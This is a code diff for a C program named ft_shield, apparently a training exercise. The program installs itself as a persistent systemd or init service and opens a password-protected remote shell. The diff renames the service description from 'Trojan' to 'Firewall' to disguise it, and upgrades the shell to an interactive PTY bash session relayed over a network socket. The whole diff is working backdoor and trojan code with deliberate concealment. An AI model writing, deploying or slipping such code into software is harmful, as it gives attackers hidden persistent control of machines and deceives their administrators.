@@ -8,6 +8,7 @@
 #include <pwd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <pty.h>
 
 #define TARGET_PATH "/usr/local/bin/ft_shield"
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
@@ -60,7 +61,7 @@ void create_service_file(int systemd_enabled)
 {
     const char *service_content_systemd =
         "[Unit]\n"
-        "Description=FT Shield Trojan Service\n"
+        "Description=FT Shield Firewall service\n"
         "After=network.target\n\n"
         "[Service]\n"
         "ExecStart=/usr/local/bin/ft_shield\n"
@@ -77,7 +78,7 @@ void create_service_file(int systemd_enabled)
         "# Required-Stop:     $network\n"
         "# Default-Start:     2 3 4 5\n"
         "# Default-Stop:      0 1 6\n"
-        "# Short-Description: FT Shield Trojan Service\n"
+        "# Short-Description: FT Shield Firewall service\n"
         "### END INIT INFO\n"
         "\n"
         "case \"$1\" in\n"
@@ -166,32 +167,78 @@ void uninstall_service(int systemd_enabled)
 void handle_client(int client_socket)
 {
     char buffer[1024];
+    int authenticated = 0;
+
     send(client_socket, "Password: ", 10, 0);
     int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
     buffer[bytes_received - 1] = '\0';
 
     if (strcmp(buffer, PASSWORD) == 0)
     {
+        authenticated = 1;
         send(client_socket, "Authentication successful.\n", 26, 0);
-        
-        if (fork() == 0)
-        {
-            dup2(client_socket, STDIN_FILENO);
-            dup2(client_socket, STDOUT_FILENO);
-            dup2(client_socket, STDERR_FILENO);
-
-            execl("/bin/sh", "/bin/sh", "-i", NULL);
-
-            perror("execl failed");
-            exit(EXIT_FAILURE);
-        }
     }
     else
     {
         send(client_socket, "Authentication failed.\n", 23, 0);
+        close(client_socket);
+        return;
     }
 
-    close(client_socket);}
+    if (authenticated)
+    {
+        int master_fd;
+        pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);  // Create a PTY for the child process
+        if (pid == -1)
+        {
+            perror("forkpty failed");
+            close(client_socket);
+            return;
+        }
+
+        if (pid == 0)
+        {
+            setenv("TERM", "xterm-256color", 1);
+            execl("/bin/bash", "/bin/bash", "-i", NULL);
+            perror("execl failed");
+            exit(EXIT_FAILURE);
+        }
+        else
+        {
+            fd_set fds;
+            while (1)
+            {
+                FD_ZERO(&fds);
+                FD_SET(client_socket, &fds);
+                FD_SET(master_fd, &fds);
+
+                if (select(master_fd + 1, &fds, NULL, NULL, NULL) < 0)
+                {
+                    perror("select failed");
+                    break;
+                }
+
+                if (FD_ISSET(master_fd, &fds))
+                {
+                    int n = read(master_fd, buffer, sizeof(buffer));
+                    if (n <= 0) break;
+                    send(client_socket, buffer, n, 0);
+                }
+
+                if (FD_ISSET(client_socket, &fds))
+                {
+                    int n = recv(client_socket, buffer, sizeof(buffer), 0);
+                    if (n <= 0) break;
+                    write(master_fd, buffer, n);
+                }
+            }
+            close(master_fd);
+        }
+    }
+
+    close(client_socket);
+}
+
 
 
 void daemon_main()
@@ -274,6 +321,12 @@ int main(int argc, char *argv[])
         uninstall_service(systemd_enabled);
         return 0;
     }
+    else if (argc > 1)
+    {
+        fprintf(stderr, "Usage: %s [--uninstall]\n", argv[0]);
+        return -1;
+    }
+    
 
     char *user = get_username();
     printf("%s\n", user);
